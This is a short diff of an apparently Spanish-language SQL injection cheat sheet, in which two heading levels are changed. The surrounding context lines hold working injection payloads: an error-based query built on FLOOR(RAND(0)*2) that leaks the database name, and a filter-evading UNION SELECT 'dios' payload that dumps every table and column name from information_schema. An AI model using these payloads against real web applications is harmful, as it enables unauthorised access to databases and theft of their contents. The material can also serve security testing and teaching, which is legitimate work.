@@ -796,7 +796,7 @@ SELECT * FROM (SELECT count(*), CONCAT((SELECT database()), 0x23, FLOOR(RAND(0)*
 ```
 
 
-#### Inyecciónes sql usando funciones sql
+## Inyecciónes sql usando funciones sql
 
 ### Sql inyection payload usando la función RPAD y SOUNDS LIKE 
 
@@ -844,7 +844,7 @@ SELECT * FROM (SELECT count(*), CONCAT((SELECT database()), 0x23, FLOOR(RAND(0)*
 
 
 
-#### Sql inyection + dios sql
+## Sql inyection + dios sql
 
 ```
 /*!u%6eion*/ /*!se%6cect*/+1,concat(@:=0,(select count(*)from information_schema.columns where@:=concat(@,'<br>',table_name,'::',column_name)),@),3..
